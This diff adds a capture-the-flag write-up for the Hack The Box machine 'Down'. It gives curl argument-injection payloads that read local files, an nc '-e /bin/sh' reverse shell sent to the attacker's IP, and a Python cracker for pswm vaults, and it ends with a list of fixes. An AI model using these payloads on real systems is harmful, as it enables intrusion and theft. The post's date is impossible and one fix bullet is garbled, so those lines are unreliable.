@@ -1,24 +1,345 @@
 ---
-title: 'HTB: Example Box Writeup'
-date: 2019-11-02 09:00:00
+title: 'HTB: Down'
+date: 2025-16-20 09:00:00
 categories: Writeups
 tags:
   - htb
   - privesc
 ---
 
-> Placeholder writeup — replace with your first real one.
+* TOC
+{:toc}
+
+**Down** is an easy Linux box (the first VulnLab → HTB migration) that hinges on a single primitive: `escapeshellcmd()` stops _command_ injection but does nothing about _argument_ injection. A website-uptime checker shells out to `curl` and `nc` with user input glued into the command string. I abuse curl's multi-URL handling to read arbitrary files, recover the PHP source, then abuse an `intval()`/original-string validation gap in an "expert mode" to inject `-e /bin/sh` into `nc` for a shell. Root falls out of a cracked `pswm` vault (scrypt + AES-GCM) and a wide-open sudo rule.
+
+
+##### Path to root, at a glance:
+1. Inject a curl argument → read arbitrary files → dump the PHP source.
+2. Read the source → find a hidden `expertmode` that runs `nc` with a validation bug.
+3. Inject `-e /bin/sh` into `nc` → shell as `www-data`.
+4. Loot a `pswm` password vault → crack it offline → password for `aleks`.
+5. `aleks` has full `sudo` → root.
+
+---
 
 ## Recon
 
+### nmap
+
 ```bash
-nmap -sC -sV -oN nmap.txt 10.10.10.10
+┌──(pwn㉿pwn)-[~/HTB]
+└─$ sudo nmap -Pn -A 10.129.47.7
+[sudo] password for pwn: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-07 13:30 -0400
+Nmap scan report for 10.129.47.7
+Host is up (0.37s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
+|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Is it down or just me?
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT       ADDRESS
+1   361.98 ms 10.10.14.1
+2   362.23 ms 10.129.47.7
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.51 seconds
 ```
 
-## Foothold
+OpenSSH 8.9p1 + Apache 2.4.52 → Ubuntu 22.04 (jammy). Neither version buys anything; the web app is the target.
 
-Describe the initial access vector here.
+### The app
 
-## Privilege Escalation
+`index.php` takes a URL and reports whether the site is up. Point it at your own listener and you see how it fetches:
 
-Describe the privesc path here.
+<img width="1231" height="610" alt="image" src="https://github.com/user-attachments/assets/edafc708-31da-464b-949d-3a0ee4b074a6" />
+
+```bash
+> nc -nvlp 80
+listening on [any] 80 ...
+connect to [10.10.14.242] from (UNKNOWN) [10.129.47.7] 35308
+GET / HTTP/1.1
+Host: 10.10.14.242
+User-Agent: curl/7.81.0
+Accept: */*
+```
+
+So the app runs something like `curl -s <your input>`. First instinct is command injection — try `http://localhost; whoami`, `| id`, `&& ping`, etc. None of it fires. So the app is escaping shell metacharacters. But escaping metacharacters is not the same as escaping _arguments_.
+
+### Argument injection → file read
+
+<img width="1237" height="768" alt="image" src="https://github.com/user-attachments/assets/785165b2-198f-4267-b10f-23f70413ee49" />
+
+Prove we control curl's argv by injecting its own help flag:
+
+```
+http://127.0.0.1 -h
+```
+
+<img width="844" height="549" alt="image" src="https://github.com/user-attachments/assets/4d57ddfc-f98b-42e8-8a55-9d531ba2849a" />
+
+The response comes back full of curl's usage text — our input is being parsed as curl options. Now weaponize it. curl fetches multiple URLs in sequence, so pass a dummy HTTP URL to satisfy the `^https?://` check, a space, then a `file://` read:
+
+```bash
+http://127.0.0.1/ file:///etc/hostname
+```
+
+```bash
+http://127.0.0.1/ file:///etc/passwd
+```
+
+<img width="1226" height="943" alt="image" src="https://github.com/user-attachments/assets/1a76d9e5-5406-4f24-b974-af138ca853a6" />
+
+From `/etc/passwd`: two real users, `root` and `aleks`.
+
+### Reading the source
+
+Grab the app source through the same primitive:
+
+```bash
+http://127.0.0.1/ file:///var/www/html/index.php
+```
+
+Two request handlers. The normal one is the `curl` branch we already abused. The interesting one is gated behind a hidden GET parameter, `?expertmode=tcp`:
+
+```php
+
+<?php
+if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
+  echo '<h1>Is the port refused, or is it just you?</h1>
+        <form id="urlForm" action="index.php?expertmode=tcp" method="POST">
+            <input type="text" id="url" name="ip" placeholder="Please enter an IP." required><br>
+            <input type="number" id="port" name="port" placeholder="Please enter a port number." required><br>
+            <button type="submit">Is it refused?</button>
+        </form>';
+} else {
+  echo '<h1>Is that website down, or is it just you?</h1>
+        <form id="urlForm" action="index.php" method="POST">
+            <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>
+            <button type="submit">Is it down?</button>
+        </form>';
+}
+
+if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
+  $ip = trim($_POST['ip']);
+  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
+  $port = trim($_POST['port']);
+  $port_int = intval($port);
+  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
+  if ( $valid_ip && $valid_port ) {
+    $rc = 255; $output = '';
+    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
+    exec($ec . " 2>&1",$output,$rc);
+    echo '<div class="output" id="outputSection">';
+    if ( $rc === 0 ) {
+      echo "<font size=+1>It is up. It's just you! 😝</font><br><br>";
+      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
+    } else {
+      echo "<font size=+1>It is down for everyone! 😔</font><br><br>";
+      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
+    }
+  } else {
+    echo '<div class="output" id="outputSection">';
+    echo '<font color=red size=+1>Please specify a correct IP and a port between 1 and 65535.</font>';
+  }
+} elseif (isset($_POST['url'])) {
+  $url = trim($_POST['url']);
+  if ( preg_match('|^https?://|',$url) ) {
+    $rc = 255; $output = '';
+    $ec = escapeshellcmd("/usr/bin/curl -s $url");
+    exec($ec . " 2>&1",$output,$rc);
+    echo '<div class="output" id="outputSection">';
+    if ( $rc === 0 ) {
+      echo "<font size=+1>It is up. It's just you! 😝</font><br><br>";
+      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
+    } else {
+      echo "<font size=+1>It is down for everyone! 😔</font><br><br>";
+    }
+  } else {
+    echo '<div class="output" id="outputSection">';
+    echo '<font color=red size=+1>Only protocols http or https allowed.</font>';
+  }
+}
+?>
+```
+
+The bug is the gap between **(1)** and **(2)**:
+
+- The port is validated _after_ `intval()`.
+- The **original string** — not the validated int — is what gets put in the command.
+
+`intval()` reads a leading number and stops at the first non-digit:
+
+```php
+php > echo intval("1234 -e /bin/sh");   // => 1234, passes FILTER_VALIDATE_INT
+```
+
+So `1234 -e /bin/sh` passes validation, then gets spliced straight into the `nc` command. Same `escapeshellcmd` as before → same argument-injection weakness. And this `nc` build supports `-e`, which runs a program on connect. That's our shell.
+
+### Shell as www-data
+
+<img width="1404" height="747" alt="image" src="https://github.com/user-attachments/assets/6a9d4994-e2e9-4e87-a5ee-7ab51f68c033" />
+
+The port field is `<input type="number">`, but that's client-side only — send the request directly. Enable expert mode with `?expertmode=tcp` and inject into `port`:
+
+<img width="1133" height="401" alt="image" src="https://github.com/user-attachments/assets/798a31db-b755-4073-9550-658a3030ed0e" />
+
+```bash
+# Listener
+nc -lnvp 443
+```
+
+```http
+POST /index.php?expertmode=tcp HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded
+
+ip=<your-ip>&port=443+-e+/bin/sh
+```
+
+The server runs `nc -vz <your-ip> 443 -e /bin/sh` and connects back. Stabilize:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl-Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+User flag: `/var/www/html/user_*.txt`.
+
+<img width="855" height="463" alt="image" src="https://github.com/user-attachments/assets/8c598c0c-3f48-446a-8164-87f7e5c1ac95" />
+
+
+---
+### Privilege escalation: the pswm vault
+
+`www-data` can partially read aleks' home:
+
+```bash
+find /home/aleks -type f 2>/dev/null
+# /home/aleks/.local/share/pswm/pswm    <-- readable
+# .ssh / .cache are 700 — denied
+```
+
+`pswm` is [Julynx's CLI password manager](https://github.com/Julynx/pswm). The vault:
+
+```
+e9laWoKiJ0Od...kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
+```
+
+Four `*`-separated base64 fields — the signature of the `cryptocode` library.
+
+<img width="1216" height="235" alt="image" src="https://github.com/user-attachments/assets/b9574382-7790-474d-ae71-3092fe64cba5" />
+
+
+#### What the format actually is
+
+The fields are `ciphertext * salt * nonce * tag`, and the scheme is:
+
+```
+key = scrypt(master_password, salt, N=2**14, r=8, p=1, dklen=32)
+pt  = AES-256-GCM.decrypt_and_verify(ciphertext, nonce, tag, key)
+```
+
+The point that makes cracking clean: **the GCM tag is a correctness oracle.** A wrong master password derives a wrong key, `decrypt_and_verify` fails the tag, and `cryptocode.decrypt` returns `False` — never a false positive. So the crack loop is just: try password → `cryptocode.decrypt` → truthy means we're in.
+
+### Cracking it
+
+`pswm` uses `cryptocode` under the hood, so the simplest reliable cracker calls the same library the target does — feed it the vault and a wordlist, and let the GCM tag decide each guess. `prettytable` just renders the recovered `alias/username/password` rows:
+
+```python
+import cryptocode
+import argparse
+from prettytable import PrettyTable
+
+class CustomHelpFormatter(argparse.HelpFormatter):
+    def __init__(self, prog):
+        super().__init__(prog, max_help_position=50)
+
+def bf(encrypted_text, wordlist):
+    with open(wordlist, "r", encoding="utf-8") as f:
+        for password in f:
+            decrypted_text = cryptocode.decrypt(encrypted_text, password.strip())
+            if decrypted_text:
+                print("[+] Master Password: %s" % password.strip())
+                print_decrypted_text(decrypted_text)
+                return
+    print("[-] Password Not Found!")
+
+def print_decrypted_text(decrypted_text):
+    table = PrettyTable()
+    table.field_names = ["Alias", "Username", "Password"]
+    for line in decrypted_text.splitlines():
+        alias, username, password = line.split("\t")
+        table.add_row([alias.strip(), username.strip(), password.strip()])
+    table.align = "l"
+    print("[+] Decrypted Data:")
+    print(table)
+
+def main():
+    parser = argparse.ArgumentParser(description="pswm master password cracker", formatter_class=CustomHelpFormatter)
+    parser.add_argument("-f", "--file", required=True, help="Path to the encrypted file")
+    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
+    args = parser.parse_args()
+
+    with open(args.file, "r") as f:
+        encrypted_text = f.read().strip()
+    
+    bf(encrypted_text, args.wordlist)
+
+if __name__ == "__main__":
+    main()
+```
+
+```bash
+$ python3 pswm-decrypt.py -f pswm -w /usr/share/wordlists/rockyou.txt
+[+] Master Password: flower
+[+] Decrypted Data:
++------------+----------+----------------------+
+| Alias      | Username | Password             |
++------------+----------+----------------------+
+| pswm       | aleks    | flower               |
+| aleks@down | aleks    | 1uY3w22uc-Wr{xNHR~+E |
++------------+----------+----------------------+
+```
+
+`flower` is near the top of rockyou, so it lands almost immediately. The vault hands us aleks' login password.
+
+> scrypt with `N=2**14` is deliberately memory-hard (~16 MB/attempt), so a serial loop is fine here only because the master password is a top-rockyou hit. Against a stronger password you'd want to parallelise across cores and skip the `cryptocode` import overhead by calling PyCryptodome directly.
+
+---
+### Root
+
+```bash
+ssh aleks@$TARGET        # password: 1uY3w22uc-Wr{xNHR~+E
+
+sudo -l
+# (ALL : ALL) ALL
+
+sudo -i
+# root@down:~#
+```
+
+<img width="1026" height="450" alt="image" src="https://github.com/user-attachments/assets/c852ad80-e204-466c-a1cc-b67b884c2c12" />
+
+Full sudo, no restrictions. Grab `root.txt`.
+
+---
+### Why it worked (three fixes)
+
+- **`escapeshellcmd()` ≠ `escapeshellarg()`.** The first blocks shell metacharacters but leaves `-` alone, so any binary behind it is open to flag injection. User input that becomes a single argument needs `escapeshellarg()`, plus `--` to end option parsing.
+- **Validate the value you actually use.** The `intval(port)‘→validate→use−‘port)` → validate → use-` port)‘→validate→use−‘port` gap _is_ the nc injection. Re-assign the sanitized int (`port=(int)port = (int) port=(int)port;`) before it touches the command.
+- **A leaked GCM vault is an offline password oracle.** The authenticity tag doubles as the "is this the right key" check, so the only thing between a stolen vault and its contents is the KDF cost — defeated here by a weak master password.
